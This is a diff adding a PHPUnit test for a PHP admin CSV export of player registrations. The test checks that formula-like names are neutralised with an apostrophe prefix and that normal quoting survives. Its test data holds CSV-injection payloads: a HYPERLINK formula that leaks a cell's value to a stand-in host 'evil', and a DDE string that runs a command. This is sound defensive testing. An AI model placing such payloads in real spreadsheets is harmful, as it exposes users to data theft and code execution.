@@ -92,6 +92,41 @@ class PlayerRegistrationExportTest extends TestCase
         $this->assertStringStartsWith("\xEF\xBB\xBF", $csv); // Excel-friendly UTF-8 BOM
     }
 
+    public function test_formula_like_guest_input_is_neutralised_in_the_csv_and_quoting_still_works(): void
+    {
+        $edition = Edition::factory()->create(['year' => 2026]);
+
+        $hostile = [
+            'Formula Eq' => '=HYPERLINK("http://evil/?"&A2,"click")',
+            'Formula Plus' => "+cmd|' /C calc'!A0",
+            'Formula At' => '@SUM(1+1)',
+            'Formula Minus' => '-2+3',
+        ];
+        $names = array_merge(array_values($hostile), ['Plain, Name "Q" Verma']);
+
+        foreach ($names as $name) {
+            PlayerRegistration::factory()->create([
+                'edition_id' => $edition->id,
+                'player_id' => Player::factory()->create(['name' => $name])->id,
+            ])->assignRegistrationNumber();
+        }
+
+        $csv = $this->streamedCsv($this->actingAs($this->admin())->get(route('admin.player-registrations.export')));
+
+        // Parse it back the way a spreadsheet would, to prove both the
+        // neutralising prefix and ordinary CSV quoting survive.
+        $rows = array_map('str_getcsv', array_filter(explode('
+', str_replace('', '', ltrim($csv, 'ï»¿')))));
+        $exportedNames = array_column(array_slice($rows, 1), 2);
+
+        foreach (array_values($hostile) as $name) {
+            $this->assertContains("'".$name, $exportedNames);
+            $this->assertNotContains($name, $exportedNames);
+        }
+
+        $this->assertContains('Plain, Name "Q" Verma', $exportedNames);
+    }
+
     public function test_edition_and_payment_status_filters_are_honored(): void
     {
         $editionA = Edition::factory()->create(['year' => 2025]);
